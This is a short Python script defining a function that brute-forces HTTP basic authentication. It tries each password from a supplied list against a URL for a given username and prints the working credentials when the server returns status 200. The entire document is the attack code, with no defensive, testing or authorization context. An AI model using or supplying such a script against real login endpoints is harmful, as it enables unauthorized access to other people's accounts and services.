import requests

def brute_force(url, username, password_list):
    for password in password_list:
        response = requests.get(url, auth=(username, password))
        if response.status_code == 200:
            print(f"Success! Username: {username}, Password: {password}")
            return
    print("Brute force attack failed.")